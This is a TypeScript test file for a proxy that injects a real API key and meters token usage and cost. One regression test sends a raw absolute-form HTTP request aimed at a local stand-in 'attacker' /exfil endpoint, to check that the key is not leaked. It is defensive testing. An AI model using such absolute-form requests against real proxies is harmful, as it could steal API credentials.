import assert from "node:assert/strict";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { test } from "node:test";

import { createModelUsageProxy } from "../src/integrations/model-usage-proxy.js";

interface FakeUpstream {
  readonly url: string;
  readonly seen: { authorization?: string; body?: string; url?: string }[];
  close(): Promise<void>;
}

async function fakeUpstream(handler: (req: http.IncomingMessage, body: Buffer, res: http.ServerResponse) => void): Promise<FakeUpstream> {
  const seen: FakeUpstream["seen"] = [];
  const server = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      const entry: { authorization?: string; body?: string; url?: string } = {};
      if (typeof req.headers.authorization === "string") entry.authorization = req.headers.authorization;
      entry.body = Buffer.concat(chunks).toString("utf8");
      if (typeof req.url === "string") entry.url = req.url;
      seen.push(entry);
      handler(req, Buffer.concat(chunks), res);
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  const address = server.address() as AddressInfo;
  return {
    url: `http://127.0.0.1:${address.port}`,
    seen,
    close: () => new Promise((resolve, reject) => server.close((error) => (error === undefined ? resolve() : reject(error)))),
  };
}

test("model usage proxy injects the real key, forces usage accounting, and meters JSON responses", async () => {
  const upstream = await fakeUpstream((_req, _body, res) => {
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({
      choices: [],
      usage: { prompt_tokens: 120, completion_tokens: 30, total_tokens: 150, cost: 0.0042 },
    }));
  });
  const proxy = await createModelUsageProxy({ upstream: upstream.url, apiKey: "REAL_KEY" });
  try {
    const response = await fetch(`${proxy.url}/api/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: "Bearer PLACEHOLDER" },
      body: JSON.stringify({ model: "test-model", messages: [], stream: false }),
    });
    assert.equal(response.status, 200);

    assert.equal(upstream.seen[0]?.authorization, "Bearer REAL_KEY", "proxy must replace the placeholder credential");
    const forwarded = JSON.parse(upstream.seen[0]?.body ?? "{}") as { usage?: { include?: boolean }; model?: string };
    assert.equal(forwarded.usage?.include, true, "proxy must force usage accounting");
    assert.equal(forwarded.model, "test-model");
    assert.equal(upstream.seen[0]?.url, "/api/v1/chat/completions");

    assert.deepEqual(proxy.metrics(), {
      requests: 1,
      usageEvents: 1,
      promptTokens: 120,
      completionTokens: 30,
      totalTokens: 150,
      costUsd: 0.0042,
    });
  } finally {
    await proxy.close();
    await upstream.close();
  }
});

test("model usage proxy meters usage from the final SSE chunk while streaming bytes through unchanged", async () => {
  const chunks = [
    'data: {"id":"1","choices":[{"delta":{"content":"hel"}}]}\n\n',
    'data: {"id":"1","choices":[{"delta":{"content":"lo"}}]}\n\n',
    'data: {"id":"1","choices":[],"usage":{"prompt_tokens":10,"completion_tokens":4,"total_tokens":14,"cost":0.0002}}\n\n',
    "data: [DONE]\n\n",
  ];
  const upstream = await fakeUpstream((_req, _body, res) => {
    res.writeHead(200, { "content-type": "text/event-stream" });
    for (const chunk of chunks) res.write(chunk);
    res.end();
  });
  const proxy = await createModelUsageProxy({ upstream: upstream.url, apiKey: "REAL_KEY" });
  try {
    const response = await fetch(`${proxy.url}/api/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ model: "test-model", messages: [], stream: true }),
    });
    assert.equal(response.status, 200);
    const received = await response.text();
    assert.equal(received, chunks.join(""), "SSE bytes must pass through unchanged");
    assert.equal(proxy.metrics().totalTokens, 14);
    assert.equal(proxy.metrics().costUsd, 0.0002);
    assert.equal(proxy.metrics().usageEvents, 1);
  } finally {
    await proxy.close();
    await upstream.close();
  }
});

test("model usage proxy passes non-completion traffic through untouched", async () => {
  const upstream = await fakeUpstream((_req, _body, res) => {
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ data: [] }));
  });
  const proxy = await createModelUsageProxy({ upstream: upstream.url, apiKey: "REAL_KEY" });
  try {
    const response = await fetch(`${proxy.url}/api/v1/models`);
    assert.equal(response.status, 200);
    assert.equal(upstream.seen[0]?.url, "/api/v1/models");
    assert.equal(upstream.seen[0]?.authorization, "Bearer REAL_KEY");
    assert.equal(proxy.metrics().requests, 1);
    assert.equal(proxy.metrics().usageEvents, 0);
  } finally {
    await proxy.close();
    await upstream.close();
  }
});

test("model usage proxy rejects absolute-form request targets without leaking the key (P1 regression)", async () => {
  const { connect } = await import("node:net");
  const attacker = await fakeUpstream((_req, _body, res) => {
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ exfiltrated: true }));
  });
  const proxy = await createModelUsageProxy({ upstream: "https://openrouter.ai", apiKey: "REAL_SECRET_KEY" });
  try {
    const response = await new Promise<string>((resolve, reject) => {
      const socket = connect(Number(new URL(proxy.url).port), "127.0.0.1", () => {
        socket.write(`GET ${attacker.url}/exfil HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n`);
      });
      let data = "";
      socket.on("data", (chunk: Buffer) => (data += chunk.toString("utf8")));
      socket.on("end", () => resolve(data));
      socket.on("error", reject);
    });
    assert.match(response, /400/, "absolute-form targets must be rejected");
    assert.equal(attacker.seen.length, 0, "attacker origin must never receive a request");
    assert.equal(proxy.metrics().requests, 1);
    assert.equal(proxy.metrics().usageEvents, 0);
  } finally {
    await proxy.close();
    await attacker.close();
  }
});

test("model usage proxy fails closed on construction and on malformed completion bodies", async () => {
  await assert.rejects(() => createModelUsageProxy({ upstream: "http://example.com", apiKey: "k" }), /https \(or loopback/);
  await assert.rejects(() => createModelUsageProxy({ upstream: "https://openrouter.ai", apiKey: " " }), /non-empty/);
  const upstream = await fakeUpstream((_req, _body, res) => {
    res.writeHead(200, { "content-type": "application/json" });
    res.end("{}");
  });
  const proxy = await createModelUsageProxy({ upstream: upstream.url, apiKey: "k" });
  try {
    const response = await fetch(`${proxy.url}/api/v1/chat/completions`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: "not-json",
    });
    assert.equal(response.status, 400);
    assert.equal(upstream.seen.length, 0, "malformed bodies must never reach the upstream");
  } finally {
    await proxy.close();
    await upstream.close();
  }
});
